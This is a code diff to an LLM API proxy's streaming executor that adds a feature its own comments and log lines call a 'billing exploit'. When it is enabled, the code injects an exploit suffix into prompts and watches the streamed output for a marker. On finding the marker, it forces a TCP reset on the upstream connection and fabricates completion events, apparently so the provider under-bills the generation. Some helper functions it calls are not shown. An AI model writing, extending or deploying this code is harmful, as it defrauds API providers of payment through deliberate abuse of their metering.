@@ -193,6 +193,10 @@ func (e *OpenAICompatExecutor) ExecuteStream(ctx context.Context, auth *cliproxy
 
 	from := opts.SourceFormat
 	to := sdktranslator.FromString("openai")
+	responsesFormat := auth != nil && auth.Attributes != nil && auth.Attributes["responses_format"] == "true"
+	if responsesFormat {
+		to = sdktranslator.FromString("openai-response")
+	}
 	originalPayloadSource := req.Payload
 	if len(opts.OriginalRequest) > 0 {
 		originalPayloadSource = opts.OriginalRequest
@@ -204,6 +208,15 @@ func (e *OpenAICompatExecutor) ExecuteStream(ctx context.Context, auth *cliproxy
 	translated, err = thinking.ApplyThinking(translated, req.Model, from.String(), to.String(), e.Identifier())
 	if err != nil {
 		return nil, err
+	}
+
+	exploitOpts := parseBillingExploit(auth)
+	if exploitOpts.Enabled {
+		if responsesFormat {
+			translated = injectExploitSuffix(translated, exploitOpts)
+		} else {
+			translated = injectExploitSuffixChatCompletions(translated, exploitOpts)
+		}
 	}
 
 	requestedModel := helps.PayloadRequestedModel(opts, req.Model)
@@ -249,7 +262,13 @@ func (e *OpenAICompatExecutor) ExecuteStream(ctx context.Context, auth *cliproxy
 		AuthValue: authValue,
 	})
 
-	httpClient := helps.NewProxyAwareHTTPClient(ctx, e.cfg, auth, 0)
+	var exploitTracker *connTracker
+	var httpClient *http.Client
+	if exploitOpts.Enabled {
+		httpClient, exploitTracker = newExploitHTTPClient(ctx, e.cfg, auth)
+	} else {
+		httpClient = helps.NewProxyAwareHTTPClient(ctx, e.cfg, auth, 0)
+	}
 	httpResp, err := httpClient.Do(httpReq)
 	if err != nil {
 		helps.RecordAPIResponseError(ctx, e.cfg, err)
@@ -277,6 +296,12 @@ func (e *OpenAICompatExecutor) ExecuteStream(ctx context.Context, auth *cliproxy
 		scanner := bufio.NewScanner(httpResp.Body)
 		scanner.Buffer(nil, 52_428_800) // 50MB
 		var param any
+
+			var md *markerDetector
+			var sentContent string
+			if exploitOpts.Enabled {
+				md = newMarkerDetector(exploitOpts.Marker)
+			}
 		for scanner.Scan() {
 			line := scanner.Bytes()
 			helps.AppendAPIResponseChunk(ctx, e.cfg, line)
@@ -306,6 +331,66 @@ func (e *OpenAICompatExecutor) ExecuteStream(ctx context.Context, auth *cliproxy
 				continue
 			}
 
+			// Billing exploit: detect marker in delta content
+			if md != nil {
+				delta := extractDeltaContent(trimmedLine, responsesFormat)
+				if delta != "" {
+					safe, found := md.Feed(delta)
+					if found {
+						if exploitTracker != nil {
+							exploitTracker.ForceRST()
+						}
+						log.Infof("billing-exploit: marker detected, RST sent for model=%s (compat)", baseModel)
+						if safe != "" {
+							sentContent += safe
+							synthLine := replaceDeltaContent(trimmedLine, safe, responsesFormat)
+							chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, opts.OriginalRequest, translated, synthLine, &param)
+							for i := range chunks {
+								select {
+								case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+								case <-ctx.Done():
+									return
+								}
+							}
+						}
+						for _, evt := range synthesizeChatCompletionsDone(baseModel, len(translated), len(sentContent)) {
+							chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, opts.OriginalRequest, translated, evt, &param)
+							if len(chunks) == 0 {
+								select {
+								case out <- cliproxyexecutor.StreamChunk{Payload: evt}:
+								case <-ctx.Done():
+									return
+								}
+							} else {
+								for i := range chunks {
+									select {
+									case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+									case <-ctx.Done():
+										return
+									}
+								}
+							}
+						}
+						reporter.EnsurePublished(ctx)
+						time.Sleep(50 * time.Millisecond)
+						return
+					}
+					if safe != "" {
+						sentContent += safe
+						synthLine := replaceDeltaContent(trimmedLine, safe, responsesFormat)
+						chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, opts.OriginalRequest, translated, synthLine, &param)
+						for i := range chunks {
+							select {
+							case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+							case <-ctx.Done():
+								return
+							}
+						}
+					}
+					continue
+				}
+			}
+
 			// OpenAI-compatible streams must use SSE data lines.
 			chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, opts.OriginalRequest, translated, bytes.Clone(trimmedLine), &param)
 			for i := range chunks {
@@ -313,6 +398,21 @@ func (e *OpenAICompatExecutor) ExecuteStream(ctx context.Context, auth *cliproxy
 				case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
 				case <-ctx.Done():
 					return
+				}
+			}
+		}
+		// Flush held buffer if stream ended without marker
+		if md != nil {
+			if remaining := md.Flush(); remaining != "" {
+				flushData, _ := sjson.SetBytes([]byte(`{"type":"response.output_text.delta"}`), "delta", remaining)
+				synthLine := append([]byte("data: "), flushData...)
+				chunks := sdktranslator.TranslateStream(ctx, to, from, req.Model, opts.OriginalRequest, translated, synthLine, &param)
+				for i := range chunks {
+					select {
+					case out <- cliproxyexecutor.StreamChunk{Payload: chunks[i]}:
+					case <-ctx.Done():
+						return
+					}
 				}
 			}
 		}
